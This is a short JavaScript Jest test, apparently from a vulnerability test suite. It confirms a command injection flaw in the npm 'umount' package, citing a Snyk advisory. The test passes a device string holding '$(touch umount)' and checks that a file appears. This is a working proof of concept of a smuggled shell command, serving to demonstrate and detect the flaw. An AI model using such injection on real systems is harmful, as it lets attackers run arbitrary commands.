//https://snyk.io/vuln/SNYK-JS-UMOUNT-564265
test("Command Injection in umount", () => {
  const root = require("umount");
  const fs = require("fs");
  const path = "./umount";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let device = '" $(touch umount) "';
  root.umount(device, function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
